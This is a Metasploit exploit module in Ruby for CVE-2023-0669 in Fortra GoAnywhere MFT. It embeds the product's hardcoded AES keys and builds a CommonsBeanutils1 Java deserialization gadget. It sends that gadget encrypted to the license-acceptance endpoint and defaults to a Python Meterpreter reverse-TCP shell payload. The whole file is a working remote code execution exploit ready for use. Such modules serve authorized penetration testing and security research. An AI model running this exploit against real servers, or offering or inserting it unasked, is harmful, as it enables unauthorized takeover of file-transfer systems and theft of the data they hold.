##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::JavaDeserialization

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Fortra GoAnywhere MFT Unsafe Deserialization RCE',
        'Description' => %q{
          This module exploits CVE-2023-0669, which is an object deserialization
          vulnerability in Fortra GoAnywhere MFT.
        },
        'Author' => [
          'Ron Bowes', # Analysis and module
        ],
        'References' => [
          ['CVE', '2023-0669'],
          ['URL', 'https://attackerkb.com/topics/mg883Nbeva/cve-2023-0669/rapid7-analysis'],
        ],
        'DisclosureDate' => '2023-02-01',
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => [ARCH_CMD],
        'Privileged' => false,
        'Targets' => [
          [
            'Version 2 Encryption',
            {
              'DefaultOptions' => {
                'VERSION' => '$2',
                'ENCRYPTION_KEY' => 'Dmmjg5tuz0Vkm4YfSicXG2aHDJVnpBROuvPVL9xAZMo=',
                'ENCRYPTION_IV' => 'QUVTL0NCQy9QS0NTNVBhZA==',
                'ENCRYPTION_ALGORITHM' => 'AES-256-CBC'
              }
            },
          ],
          [
            'Version 1 Encryption',
            {
              'DefaultOptions' => {
                'VERSION' => nil,
                'ENCRYPTION_KEY' => 'Z4tYML+Lii4EdLl9bNGOhF+8SxH8oNavLbHrEUwp/Es=',
                'ENCRYPTION_IV' => 'QUVTL0NCQy9QS0NTNVBhZA==',
                'ENCRYPTION_ALGORITHM' => 'AES-256-CBC'
              }
            }
          ],
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8001,
          'SSL' => true,
          'Payload' => 'cmd/unix/python/meterpreter/reverse_tcp'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Unsafe deserialization endpoint', '/goanywhere/lic/accept?bundle=']),
      OptString.new('VERSION', [false, 'A version value to append to the encrypted data', '$2']),
    ])

    register_advanced_options([
      OptString.new('ENCRYPTION_KEY', [true, 'The encryption key to use (base64-encoded)']),
      OptString.new('ENCRYPTION_IV', [true, 'The initialization vector (base64-encoded)']),
      OptString.new('ENCRYPTION_ALGORITHM', [true, 'The encryption algorithm'])
    ])
  end

  def exploit
    vprint_status('Generating a serialized Java object with the payload')
    obj = generate_java_deserialization_for_payload('CommonsBeanutils1', payload)

    vprint_status('Encrypting the payload')
    cipher = OpenSSL::Cipher.new(datastore['ENCRYPTION_ALGORITHM'])
    cipher.encrypt
    cipher.iv = Base64::decode64(datastore['ENCRYPTION_IV'])
    cipher.key = Base64::decode64(datastore['ENCRYPTION_KEY'])
    obj = cipher.update(obj) + cipher.final()

    vprint_status('Sending request to the server')
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => "#{datastore['TARGETURI']}#{Base64::urlsafe_encode64(obj)}#{datastore['VERSION'] || ''}"
    )

    if res&.code != 500
      fail_with(Failure::Unknown, "Expected the server to return HTTP/500, instead received HTTP/#{res&.code}")
    end
  end
end
